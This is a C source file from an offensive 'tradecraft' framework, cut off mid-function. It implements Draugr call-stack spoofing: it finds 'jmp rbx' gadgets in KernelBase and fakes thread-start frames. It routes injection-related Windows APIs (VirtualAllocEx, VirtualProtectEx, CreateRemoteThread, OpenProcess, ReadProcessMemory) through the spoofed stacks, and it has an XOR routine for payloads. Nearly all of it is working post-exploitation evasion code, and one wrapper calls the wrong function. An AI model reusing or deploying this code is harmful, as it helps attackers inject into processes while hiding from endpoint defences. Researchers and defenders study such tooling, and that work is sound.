/*
 * Copyright (C) 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
 *
 * This file is part of Tradecraft Garden
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License along
 *  with this program; if not, see <https://www.gnu.org/licenses/>.
 */

#include <windows.h>
#include <wininet.h>
#include "draugr.h"
#include "proxy.h"
#include "hash.h"
#include "utils.h"

#define memset(x, y, z) __stosb((unsigned char *)x, y, z);

typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

typedef ULONG NTAPI (*RTLRANDOMEX)(PULONG);

/* the proxy pic */
DECLSPEC_IMPORT PVOID SpoofStub(PVOID, PVOID, PVOID, PVOID, PDRAUGR_PARAMETERS, PVOID, SIZE_T, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID);

/* store resolved functions */
void * g_ExitThread;

/* patched in from loader.spec */
char xorkey[128] = { 1 };

void applyxor(char * data, DWORD len) {
	for (DWORD x = 0; x < len; x++) {
		data[x] ^= xorkey[x % 128];
	}
}

/* some globals */
char *                g_dllBase;
DWORD                 g_dllSize;
SYNTHETIC_STACK_FRAME g_stackFrame;

void init_frame_info()
{
	PVOID pModuleFrame1 = GetModuleHandleA("kernel32.dll");
    PVOID pModuleFrame2 = GetModuleHandleA("ntdll.dll");

    g_stackFrame.Frame1.ModuleAddress   = pModuleFrame1;
    g_stackFrame.Frame1.FunctionAddress = (PVOID)GetProcAddress((HMODULE)pModuleFrame1, "BaseThreadInitThunk");
    g_stackFrame.Frame1.Offset          = 0x17;

    g_stackFrame.Frame2.ModuleAddress   = pModuleFrame2;
    g_stackFrame.Frame2.FunctionAddress = (PVOID)GetProcAddress((HMODULE)pModuleFrame2, "RtlUserThreadStart");
    g_stackFrame.Frame2.Offset          = 0x2c;

    g_stackFrame.pGadget                = GetModuleHandleA("KernelBase.dll");
}

BOOL get_text_section_size(PVOID pModule, PDWORD pdwVirtualAddress, PDWORD pdwSize)
{
    PIMAGE_DOS_HEADER pImgDosHeader = (PIMAGE_DOS_HEADER)(pModule);
    
    if (pImgDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    PIMAGE_NT_HEADERS pImgNtHeaders = (PIMAGE_NT_HEADERS)((UINT_PTR)pModule + pImgDosHeader->e_lfanew);
    
    if (pImgNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    PIMAGE_SECTION_HEADER   pImgSectionHeader = IMAGE_FIRST_SECTION(pImgNtHeaders);
    
    for (int i = 0; i < pImgNtHeaders->FileHeader.NumberOfSections; i++)
    {
        if (_strncmp((char*)pImgSectionHeader[i].Name, (char*)".text", IMAGE_SIZEOF_SHORT_NAME) == 0)
        {
            *pdwVirtualAddress = pImgSectionHeader[i].VirtualAddress;
            *pdwSize = pImgSectionHeader[i].SizeOfRawData;
            return TRUE;
        }
    }

    return FALSE;
}

PVOID calculate_function_stack_size(PRUNTIME_FUNCTION pRuntimeFunction, const DWORD64 imageBase)
{
    PUNWIND_INFO pUnwindInfo = NULL;
    ULONG unwindOperation    = 0;
    ULONG operationInfo      = 0;
    ULONG index              = 0;
    ULONG frameOffset        = 0;

    STACK_FRAME stackFrame;
    memset(&stackFrame, 0, sizeof(stackFrame));

    if (!pRuntimeFunction) {
        return NULL;
    }

    pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + imageBase);
    
    while (index < pUnwindInfo->CountOfCodes)
    {
        unwindOperation = pUnwindInfo->UnwindCode[index].UnwindOp;
        operationInfo = pUnwindInfo->UnwindCode[index].OpInfo;

        /* don't use switch as it produces jump tables */
        if (unwindOperation == UWOP_PUSH_NONVOL)
        {
            stackFrame.TotalStackSize += 8;
            if (RBP_OP_INFO == operationInfo) {
                stackFrame.PushRbp = TRUE;
                stackFrame.CountOfCodes = pUnwindInfo->CountOfCodes;
                stackFrame.PushRbpIndex = index + 1;
            }
        }
        else if (unwindOperation == UWOP_SAVE_NONVOL)
        {
            index += 1;
        }
        else if (unwindOperation == UWOP_ALLOC_SMALL)
        {
            stackFrame.TotalStackSize += ((operationInfo * 8) + 8);
        }
        else if (unwindOperation == UWOP_ALLOC_LARGE)
        {
            index += 1;
            frameOffset = pUnwindInfo->UnwindCode[index].FrameOffset;
            if (operationInfo == 0) {
                frameOffset *= 8;
            }
            else {
                index += 1;
                frameOffset += (pUnwindInfo->UnwindCode[index].FrameOffset << 16);
            }
            stackFrame.TotalStackSize += frameOffset;
        }
        else if (unwindOperation == UWOP_SET_FPREG)
        {
            stackFrame.SetsFramePointer = TRUE;
        }
        else if (unwindOperation == UWOP_SAVE_XMM128)
        {
            return NULL;
        }

        index += 1;
    }

    if (0 != (pUnwindInfo->Flags & UNW_FLAG_CHAININFO))
    {
        index = pUnwindInfo->CountOfCodes;
        if (0 != (index & 1)) {
            index += 1;
        }

        pRuntimeFunction = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[index]);
        return calculate_function_stack_size(pRuntimeFunction, imageBase);
    }

    stackFrame.TotalStackSize += 8;
    return (PVOID)(stackFrame.TotalStackSize);
}

PVOID calculate_function_stack_size_wrapper(PVOID returnAddress)
{
    PRUNTIME_FUNCTION     pRuntimeFunction = NULL;
    DWORD64               ImageBase        = 0;
    PUNWIND_HISTORY_TABLE pHistoryTable    = NULL;

    if (!returnAddress) {
        return NULL;
    }

    pRuntimeFunction = RtlLookupFunctionEntry((DWORD64)returnAddress, &ImageBase, pHistoryTable);

    if (NULL == pRuntimeFunction) {
        return NULL;
    }

    return calculate_function_stack_size(pRuntimeFunction, ImageBase);
}

PVOID find_gadget(PVOID pModuleAddr)
{
    BOOL bFoundGadgets      = FALSE;
    DWORD dwTextSectionSize = 0;
    DWORD dwTextSectionVa   = 0;
    DWORD dwCounter         = 0;
    ULONG seed              = 0;
    ULONG randomNbr         = 0;
    PVOID pModTextSection   = NULL;

    PVOID pGadgetList[15];
    memset(&pGadgetList, 0, (sizeof(PVOID) * 8));

	RTLRANDOMEX rtlRandomEx = (RTLRANDOMEX)GetProcAddress(GetModuleHandleA("ntdll"), "RtlRandomEx");

    if (!bFoundGadgets)
    {
        if (!get_text_section_size(pModuleAddr, &dwTextSectionVa, &dwTextSectionSize)) {
            return NULL;
        }

        pModTextSection = (PBYTE)((UINT_PTR)pModuleAddr + dwTextSectionVa);

        for (int i = 0; i < (dwTextSectionSize - 2); i++)
        {
            // Searching for jmp rbx gadget
            if (((PBYTE)pModTextSection)[i] == 0xFF && ((PBYTE)pModTextSection)[i + 1] == 0x23)
            {
                pGadgetList[dwCounter] = (void*)((UINT_PTR)pModTextSection + i);
                dwCounter++;

                if (dwCounter == 15) {
                    break;
                }
            }
        }

        bFoundGadgets = TRUE;
    }

    seed = 0x1337;
    randomNbr = rtlRandomEx(&seed);
    randomNbr %= dwCounter;

    return pGadgetList[randomNbr];
}

ULONG_PTR draugr_spoof_call(PVOID pFunctionAddr, PVOID pArg1, PVOID pArg2, PVOID pArg3, PVOID pArg4, PVOID pArg5, PVOID pArg6, PVOID pArg7, PVOID pArg8, PVOID pArg9, PVOID pArg10, PVOID pArg11, PVOID pArg12)
{
    int attempts        = 0;
    PVOID returnAddress = NULL;

    DRAUGR_PARAMETERS draugrParameters;
    memset(&draugrParameters, 0, sizeof(DRAUGR_PARAMETERS));

    // configure BaseThreadInitThunk frame
    returnAddress = (void*)((UINT_PTR)g_stackFrame.Frame1.FunctionAddress + g_stackFrame.Frame1.Offset);
    draugrParameters.BaseThreadInitThunkStackSize = calculate_function_stack_size_wrapper(returnAddress);
    draugrParameters.BaseThreadInitThunkReturnAddress = returnAddress;

    if (!draugrParameters.BaseThreadInitThunkStackSize || !draugrParameters.BaseThreadInitThunkReturnAddress) {
        return (ULONG_PTR)(NULL);
    }

    // configure RtlUserThreadStart frame.
    returnAddress = (void*)((UINT_PTR)g_stackFrame.Frame2.FunctionAddress + g_stackFrame.Frame2.Offset);
    draugrParameters.RtlUserThreadStartStackSize = calculate_function_stack_size_wrapper(returnAddress);
    draugrParameters.RtlUserThreadStartReturnAddress = returnAddress;

    if (!draugrParameters.RtlUserThreadStartStackSize || !draugrParameters.RtlUserThreadStartReturnAddress) {
        return (ULONG_PTR)(NULL);
    }

    /*
    * Ensure that the gadget stack size is bigger than 0x80, which is min
    * required to hold 10 arguments, otherwise it will crash sporadically.
    */

    do {
        draugrParameters.Trampoline          = find_gadget(g_stackFrame.pGadget);
        draugrParameters.TrampolineStackSize = calculate_function_stack_size_wrapper(draugrParameters.Trampoline);
        
        attempts++;

        // quick sanity check for infinite loop
        if (attempts > 15) {
            return (ULONG_PTR)(NULL);
        }

    } while (draugrParameters.TrampolineStackSize == NULL || ((__int64)draugrParameters.TrampolineStackSize < 0x80));

    if (!draugrParameters.Trampoline || !draugrParameters.TrampolineStackSize) {
        return (ULONG_PTR)(NULL);
    }

    // make the call!
    return (ULONG_PTR)SpoofStub(pArg1, pArg2, pArg3, pArg4, &draugrParameters, pFunctionAddr, 8, pArg5, pArg6, pArg7, pArg8, pArg9, pArg10, pArg11, pArg12);
}

ULONG_PTR draugr(PFUNCTION_CALL functionCall)
{
    /* very inelegant */
    if (functionCall->argc == 0) {
        return draugr_spoof_call(functionCall->function, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    } else if (functionCall->argc == 1) {
        return draugr_spoof_call(functionCall->function, (PVOID)draugrArg(0), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    } else if (functionCall->argc == 2) {
        return draugr_spoof_call(functionCall->function, (PVOID)draugrArg(0), (PVOID)draugrArg(1), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    } else if (functionCall->argc == 3) {
        return draugr_spoof_call(functionCall->function, (PVOID)draugrArg(0), (PVOID)draugrArg(1), (PVOID)draugrArg(2), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    } else if (functionCall->argc == 4) {
        return draugr_spoof_call(functionCall->function, (PVOID)draugrArg(0), (PVOID)draugrArg(1), (PVOID)draugrArg(2), (PVOID)draugrArg(3), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    } else if (functionCall->argc == 5) {
        return draugr_spoof_call(functionCall->function, (PVOID)draugrArg(0), (PVOID)draugrArg(1), (PVOID)draugrArg(2), (PVOID)draugrArg(3), (PVOID)draugrArg(4), NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    } else if (functionCall->argc == 6) {
        return draugr_spoof_call(functionCall->function, (PVOID)draugrArg(0), (PVOID)draugrArg(1), (PVOID)draugrArg(2), (PVOID)draugrArg(3), (PVOID)draugrArg(4), (PVOID)draugrArg(5), NULL, NULL, NULL, NULL, NULL, NULL);
    } else if (functionCall->argc == 7) {
        return draugr_spoof_call(functionCall->function, (PVOID)draugrArg(0), (PVOID)draugrArg(1), (PVOID)draugrArg(2), (PVOID)draugrArg(3), (PVOID)draugrArg(4), (PVOID)draugrArg(5), (PVOID)draugrArg(6), NULL, NULL, NULL, NULL, NULL);
    } else if (functionCall->argc == 8) {
        return draugr_spoof_call(functionCall->function, (PVOID)draugrArg(0), (PVOID)draugrArg(1), (PVOID)draugrArg(2), (PVOID)draugrArg(3), (PVOID)draugrArg(4), (PVOID)draugrArg(5), (PVOID)draugrArg(6), (PVOID)draugrArg(7), NULL, NULL, NULL, NULL);
    } else if (functionCall->argc == 9) {
        return draugr_spoof_call(functionCall->function, (PVOID)draugrArg(0), (PVOID)draugrArg(1), (PVOID)draugrArg(2), (PVOID)draugrArg(3), (PVOID)draugrArg(4), (PVOID)draugrArg(5), (PVOID)draugrArg(6), (PVOID)draugrArg(7), (PVOID)draugrArg(8), NULL, NULL, NULL);
    } else if (functionCall->argc == 10) {
        return draugr_spoof_call(functionCall->function, (PVOID)draugrArg(0), (PVOID)draugrArg(1), (PVOID)draugrArg(2), (PVOID)draugrArg(3), (PVOID)draugrArg(4), (PVOID)draugrArg(5), (PVOID)draugrArg(6), (PVOID)draugrArg(7), (PVOID)draugrArg(8), (PVOID)draugrArg(9), NULL, NULL);
    } else if (functionCall->argc == 11) {
        return draugr_spoof_call(functionCall->function, (PVOID)draugrArg(0), (PVOID)draugrArg(1), (PVOID)draugrArg(2), (PVOID)draugrArg(3), (PVOID)draugrArg(4), (PVOID)draugrArg(5), (PVOID)draugrArg(6), (PVOID)draugrArg(7), (PVOID)draugrArg(8), (PVOID)draugrArg(9), (PVOID)draugrArg(10), NULL);
    } else if (functionCall->argc == 12) {
        return draugr_spoof_call(functionCall->function, (PVOID)draugrArg(0), (PVOID)draugrArg(1), (PVOID)draugrArg(2), (PVOID)draugrArg(3), (PVOID)draugrArg(4), (PVOID)draugrArg(5), (PVOID)draugrArg(6), (PVOID)draugrArg(7), (PVOID)draugrArg(8), (PVOID)draugrArg(9), (PVOID)draugrArg(10), (PVOID)draugrArg(11));
    }

    return (ULONG_PTR)(NULL);
}

#ifdef DEBUG
#include "picodebug.h"
#endif

LPVOID WINAPI _VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
{
    #if DEBUG
    dprintf("[POSTEX] _VirtualAlloc\n");
    dprintf(" -> lpAddress        : 0x%lp\n", lpAddress);
    dprintf(" -> dwSize           : %d\n", dwSize);
    dprintf(" -> flAllocationType : %d\n", flAllocationType);
    dprintf(" -> flProtect        : %d\n", flProtect);
    #endif

	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(VirtualAlloc);
	call.argc     = 4;
	call.args[0]  = (ULONG_PTR)(lpAddress);
    call.args[1]  = (ULONG_PTR)(dwSize);
    call.args[2]  = (ULONG_PTR)(flAllocationType);
    call.args[3]  = (ULONG_PTR)(flProtect);

	return (LPVOID)draugr(&call);
}

LPVOID WINAPI _VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
{
    #if DEBUG
    dprintf("[POSTEX] _VirtualAllocEx\n");
    dprintf(" -> hProcess         : 0x%lp\n", hProcess);
    dprintf(" -> lpAddress        : 0x%lp\n", lpAddress);
    dprintf(" -> dwSize           : %d\n", dwSize);
    dprintf(" -> flAllocationType : %d\n", flAllocationType);
    dprintf(" -> flProtect        : %d\n", flProtect);
    #endif

	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(VirtualAllocEx);
	call.argc     = 5;
	call.args[0]  = (ULONG_PTR)(hProcess);
    call.args[1]  = (ULONG_PTR)(lpAddress);
    call.args[2]  = (ULONG_PTR)(dwSize);
    call.args[3]  = (ULONG_PTR)(flAllocationType);
    call.args[4]  = (ULONG_PTR)(flProtect);

	return (LPVOID)draugr(&call);
}

BOOL WINAPI _VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
{
    #if DEBUG
    dprintf("[POSTEX] _VirtualProtect\n");
    dprintf(" -> lpAddress      : 0x%lp\n", lpAddress);
    dprintf(" -> dwSize         : %d\n", dwSize);
    dprintf(" -> flNewProtect   : %d\n", flNewProtect);
    dprintf(" -> lpflOldProtect : 0x%lp\n", lpflOldProtect);
    #endif

	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(VirtualProtect);
	call.argc     = 4;
	call.args[0]  = (ULONG_PTR)(lpAddress);
    call.args[1]  = (ULONG_PTR)(dwSize);
    call.args[2]  = (ULONG_PTR)(flNewProtect);
    call.args[3]  = (ULONG_PTR)(lpflOldProtect);

	return (BOOL)draugr(&call);
}

BOOL WINAPI _VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
{
    #if DEBUG
    dprintf("[POSTEX] _VirtualProtectEx\n");
    dprintf(" -> hProcess       : 0x%lp\n", hProcess);
    dprintf(" -> lpAddress      : 0x%lp\n", lpAddress);
    dprintf(" -> dwSize         : %d\n", dwSize);
    dprintf(" -> flNewProtect   : %d\n", flNewProtect);
    dprintf(" -> lpflOldProtect : 0x%lp\n", lpflOldProtect);
    #endif

	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(VirtualProtectEx);
	call.argc     = 5;
    call.args[0]  = (ULONG_PTR)(hProcess);
	call.args[1]  = (ULONG_PTR)(lpAddress);
    call.args[2]  = (ULONG_PTR)(dwSize);
    call.args[3]  = (ULONG_PTR)(flNewProtect);
    call.args[4]  = (ULONG_PTR)(lpflOldProtect);

	return (BOOL)draugr(&call);
}

BOOL WINAPI _VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
{
    #if DEBUG
    dprintf("[POSTEX] _VirtualFree\n");
    dprintf(" -> lpAddress  : 0x%lp\n", lpAddress);
    dprintf(" -> dwSize     : %d\n", dwSize);
    dprintf(" -> dwFreeType : %d\n", dwFreeType);
    #endif

	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(VirtualFree);
	call.argc     = 3;
    call.args[0]  = (ULONG_PTR)(lpAddress);
	call.args[1]  = (ULONG_PTR)(dwSize);
    call.args[2]  = (ULONG_PTR)(dwFreeType);

	return (BOOL)draugr(&call);
}

BOOL WINAPI _GetThreadContext(HANDLE hThread, LPCONTEXT lpContext)
{
    #if DEBUG
    dprintf("[POSTEX] _GetThreadContext\n");
    dprintf(" -> hThread   : 0x%lp\n", hThread);
    dprintf(" -> lpContext : 0x%lp\n", lpContext);
    #endif

	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(GetThreadContext);
	call.argc     = 2;
    call.args[0]  = (ULONG_PTR)(hThread);
	call.args[1]  = (ULONG_PTR)(lpContext);

	return (BOOL)draugr(&call);
}

BOOL WINAPI _SetThreadContext(HANDLE hThread, const CONTEXT *lpContext)
{
    #if DEBUG
    dprintf("[POSTEX] _SetThreadContext\n");
    dprintf(" -> hThread   : 0x%lp\n", hThread);
    dprintf(" -> lpContext : 0x%lp\n", lpContext);
    #endif

	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(SetThreadContext);
	call.argc     = 2;
    call.args[0]  = (ULONG_PTR)(hThread);
	call.args[1]  = (ULONG_PTR)(lpContext);

	return (BOOL)draugr(&call);
}

DWORD WINAPI _ResumeThread(HANDLE hThread)
{
    #if DEBUG
    dprintf("[POSTEX] _ResumeThread\n");
    dprintf(" -> hThread : 0x%lp\n", hThread);
    #endif

	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(ResumeThread);
	call.argc     = 1;
	call.args[0]  = (ULONG_PTR)(hThread);

	return (DWORD)draugr(&call);
}

HANDLE WINAPI _CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
{
    #if DEBUG
    dprintf("[POSTEX] _CreateThread\n");
    dprintf(" -> lpThreadAttributes : 0x%lp\n", lpThreadAttributes);
    dprintf(" -> dwStackSize        : %d\n", dwStackSize);
    dprintf(" -> lpStartAddress     : 0x%lp\n", lpStartAddress);
    dprintf(" -> lpParameter        : 0x%lp\n", lpParameter);
    dprintf(" -> dwCreationFlags    : %d\n", dwCreationFlags);
    dprintf(" -> lpThreadId         : 0x%lp\n", lpThreadId);
    #endif

	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(CreateThread);
	call.argc     = 6;
	call.args[0]  = (ULONG_PTR)(lpThreadAttributes);
    call.args[1]  = (ULONG_PTR)(dwStackSize);
    call.args[2]  = (ULONG_PTR)(lpStartAddress);
    call.args[3]  = (ULONG_PTR)(lpParameter);
    call.args[4]  = (ULONG_PTR)(dwCreationFlags);
    call.args[5]  = (ULONG_PTR)(lpThreadId);

	return (HANDLE)draugr(&call);
}

HANDLE WINAPI _CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
{
    #if DEBUG
    dprintf("[POSTEX] _CreateRemoteThread\n");
    dprintf(" -> hProcess           : 0x%lp\n", hProcess);
    dprintf(" -> lpThreadAttributes : 0x%lp\n", lpThreadAttributes);
    dprintf(" -> dwStackSize        : %d\n", dwStackSize);
    dprintf(" -> lpStartAddress     : 0x%lp\n", lpStartAddress);
    dprintf(" -> lpParameter        : 0x%lp\n", lpParameter);
    dprintf(" -> dwCreationFlags    : %d\n", dwCreationFlags);
    dprintf(" -> lpThreadId         : 0x%lp\n", lpThreadId);
    #endif

	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(CreateRemoteThread);
	call.argc     = 7;
	call.args[0]  = (ULONG_PTR)(hProcess);
    call.args[1]  = (ULONG_PTR)(lpThreadAttributes);
    call.args[2]  = (ULONG_PTR)(dwStackSize);
    call.args[3]  = (ULONG_PTR)(lpStartAddress);
    call.args[4]  = (ULONG_PTR)(lpParameter);
    call.args[5]  = (ULONG_PTR)(dwCreationFlags);
    call.args[6]  = (ULONG_PTR)(lpThreadId);

	return (HANDLE)draugr(&call);
}

HANDLE WINAPI _OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
{
    #if DEBUG
    dprintf("[POSTEX] _OpenProcess\n");
    dprintf(" -> dwDesiredAccess : %d\n", dwDesiredAccess);
    dprintf(" -> bInheritHandle  : %d\n", bInheritHandle);
    dprintf(" -> dwProcessId     : %d\n", dwProcessId);
    #endif

	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(OpenProcess);
	call.argc     = 3;
	call.args[0]  = (ULONG_PTR)(dwDesiredAccess);
    call.args[1]  = (ULONG_PTR)(bInheritHandle);
    call.args[2]  = (ULONG_PTR)(dwProcessId);

	return (HANDLE)draugr(&call);
}

HANDLE WINAPI _OpenThread(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId)
{
    #if DEBUG
    dprintf("[POSTEX] _OpenThread\n");
    dprintf(" -> dwDesiredAccess : %d\n", dwDesiredAccess);
    dprintf(" -> bInheritHandle  : %d\n", bInheritHandle);
    dprintf(" -> dwThreadId      : %d\n", dwThreadId);
    #endif

	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(OpenThread);
	call.argc     = 3;
	call.args[0]  = (ULONG_PTR)(dwDesiredAccess);
    call.args[1]  = (ULONG_PTR)(bInheritHandle);
    call.args[2]  = (ULONG_PTR)(dwThreadId);

	return (HANDLE)draugr(&call);
}

BOOL WINAPI _CloseHandle(HANDLE hObject)
{
    #if DEBUG
    dprintf("[POSTEX] _CloseHandle\n");
    dprintf(" -> hObject : 0x%lp\n", hObject);
    #endif

	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(CloseHandle);
	call.argc     = 1;
	call.args[0]  = (ULONG_PTR)(hObject);

	return (BOOL)draugr(&call);
}

HANDLE WINAPI _CreateFileMappingA(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName)
{
    #if DEBUG
    dprintf("[POSTEX] _CreateFileMappingA\n");
    dprintf(" -> hFile                   : 0x%lp\n", hFile);
    dprintf(" -> lpFileMappingAttributes : 0x%lp\n", lpFileMappingAttributes);
    dprintf(" -> flProtect               : %d\n", flProtect);
    dprintf(" -> dwMaximumSizeHigh       : %d\n", dwMaximumSizeHigh);
    dprintf(" -> dwMaximumSizeLow        : %d\n", dwMaximumSizeLow);
    dprintf(" -> lpName                  : %s\n", lpName);
    #endif

	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(CreateFileMappingA);
	call.argc     = 6;
	call.args[0]  = (ULONG_PTR)(hFile);
    call.args[1]  = (ULONG_PTR)(lpFileMappingAttributes);
    call.args[2]  = (ULONG_PTR)(flProtect);
    call.args[3]  = (ULONG_PTR)(dwMaximumSizeHigh);
    call.args[4]  = (ULONG_PTR)(dwMaximumSizeLow);
    call.args[5]  = (ULONG_PTR)(lpName);

	return (HANDLE)draugr(&call);
}

LPVOID WINAPI _MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap)
{
    #if DEBUG
    dprintf("[POSTEX] _MapViewOfFile\n");
    dprintf(" -> hFileMappingObject   : 0x%lp\n", hFileMappingObject);
    dprintf(" -> dwDesiredAccess      : %d\n", dwDesiredAccess);
    dprintf(" -> dwFileOffsetHigh     : %d\n", dwFileOffsetHigh);
    dprintf(" -> dwFileOffsetLow      : %d\n", dwFileOffsetLow);
    dprintf(" -> dwNumberOfBytesToMap : %d\n", dwNumberOfBytesToMap);
    #endif

	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(MapViewOfFile);
	call.argc     = 5;
	call.args[0]  = (ULONG_PTR)(hFileMappingObject);
    call.args[1]  = (ULONG_PTR)(dwDesiredAccess);
    call.args[2]  = (ULONG_PTR)(dwFileOffsetHigh);
    call.args[3]  = (ULONG_PTR)(dwFileOffsetLow);
    call.args[4]  = (ULONG_PTR)(dwNumberOfBytesToMap);

	return (LPVOID)draugr(&call);
}

BOOL WINAPI _UnmapViewOfFile(LPCVOID lpBaseAddress)
{
    #if DEBUG
    dprintf("[POSTEX] _UnmapViewOfFile\n");
    dprintf(" -> lpBaseAddress : 0x%lp\n", lpBaseAddress);
    #endif

	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(MapViewOfFile);
	call.argc     = 1;
	call.args[0]  = (ULONG_PTR)(lpBaseAddress);

	return (BOOL)draugr(&call);
}

SIZE_T WINAPI _VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength)
{
    #if DEBUG
    dprintf("[POSTEX] _VirtualQuery\n");
    dprintf(" -> lpAddress : 0x%lp\n", lpAddress);
    dprintf(" -> lpBuffer  : 0x%lp\n", lpBuffer);
    dprintf(" -> dwLength  : %d\n", dwLength);
    #endif

	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(VirtualQuery);
	call.argc     = 3;
	call.args[0]  = (ULONG_PTR)(lpAddress);
    call.args[1]  = (ULONG_PTR)(lpBuffer);
    call.args[2]  = (ULONG_PTR)(dwLength);

	return (SIZE_T)draugr(&call);
}

BOOL WINAPI _DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions)
{
    #if DEBUG
    dprintf("[POSTEX] _DuplicateHandle\n");
    dprintf(" -> hSourceProcessHandle : 0x%lp\n", hSourceProcessHandle);
    dprintf(" -> hSourceHandle        : 0x%lp\n", hSourceHandle);
    dprintf(" -> hTargetProcessHandle : 0x%lp\n", hTargetProcessHandle);
    dprintf(" -> lpTargetHandle       : 0x%lp\n", lpTargetHandle);
    dprintf(" -> dwDesiredAccess      : %d\n", dwDesiredAccess);
    dprintf(" -> bInheritHandle       : %d\n", bInheritHandle);
    dprintf(" -> dwOptions            : %d\n", dwOptions);
    #endif

	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(DuplicateHandle);
	call.argc     = 7;
	call.args[0]  = (ULONG_PTR)(hSourceProcessHandle);
    call.args[1]  = (ULONG_PTR)(hSourceHandle);
    call.args[2]  = (ULONG_PTR)(hTargetProcessHandle);
    call.args[3]  = (ULONG_PTR)(lpTargetHandle);
    call.args[4]  = (ULONG_PTR)(dwDesiredAccess);
    call.args[5]  = (ULONG_PTR)(bInheritHandle);
    call.args[6]  = (ULONG_PTR)(dwOptions);

	return (BOOL)draugr(&call);
}

BOOL WINAPI _ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesRead)
{
    #if DEBUG
    dprintf("[POSTEX] _ReadProcessMemory\n");
    dprintf(" -> hProcess            : 0x%lp\n", hProcess);
    dprintf(" -> lpBaseAddress       : 0x%lp\n", lpBaseAddress);
    dprintf(" -> lpBuffer            : 0x%lp\n", lpBuffer);
    dprintf(" -> nSize               : %d\n", nSize);
    dprintf(" -> lpNumberOfBytesRead : 0x%lp\n", lpNumberOfBytesRead);
    #endif

	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(ReadProcessMemory);
	call.argc     = 5;
	call.args[0]  = (ULONG_PTR)(hProcess);
